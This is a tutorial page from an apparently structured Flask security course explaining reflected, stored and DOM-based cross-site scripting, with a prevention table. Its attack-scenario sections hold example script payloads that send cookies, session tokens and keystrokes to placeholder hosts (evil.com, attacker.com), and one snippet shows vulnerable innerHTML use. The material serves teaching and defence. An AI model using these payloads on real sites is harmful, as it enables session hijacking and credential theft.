<!-- FILE: 18_rate_limiting_and_security/04_xss_and_csrf/01_what_is_xss.md -->

## Overview

Understand Cross-Site Scripting (XSS) attacks and their impact on Flask applications.

## Prerequisites

- Basic understanding of HTML/JavaScript
- Understanding of web security

## Core Concepts

XSS occurs when attackers inject malicious scripts into web pages viewed by other users. The browser executes these scripts, potentially stealing cookies, session tokens, or performing actions on behalf of the victim.

## XSS Types

### 1. Reflected XSS

Malicious script is part of the URL and reflected back in the response.

```
# Attack URL
https://example.com/search?q=<script>stealCookies()</script>

# Server renders:
# <p>Results for: <script>stealCookies()</script></p>
```

### 2. Stored XSS

Malicious script is stored in the database and served to all users.

```
# Attacker posts a comment:
# <script>document.location='http://evil.com?c='+document.cookie</script>

# All users viewing the comment execute the script
```

### 3. DOM-based XSS

Client-side JavaScript processes user input without sanitization.

```javascript
// Vulnerable code
document.getElementById('output').innerHTML = 
    new URLSearchParams(window.location.search).get('name');
```

## Attack Scenarios

### Cookie Theft

```html
<!-- Attacker injects this via comment -->
<script>
fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

### Session Hijacking

```javascript
// Steal session and send to attacker
fetch('https://attacker.com/hijack?session=' + document.cookie);
```

### Keylogging

```javascript
// Log user keystrokes
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
```

## Real-World Impact

- Account takeover via stolen sessions
- Credential theft via fake login forms
- Malware distribution
- Defacement of website
- Mining cryptocurrency in user's browser

> **🔒 Security Note:** XSS is one of the most common web vulnerabilities. Always sanitize user input.

## Quick Reference

| Type | How it works | Prevention |
|------|--------------|------------|
| Reflected | URL parameter | Escape output |
| Stored | Database | Escape output |
| DOM | Client-side | Safe DOM APIs |

## Next Steps

Continue to [02_preventing_xss_in_flask.md](./02_preventing_xss_in_flask.md) to learn how to prevent XSS in Flask.
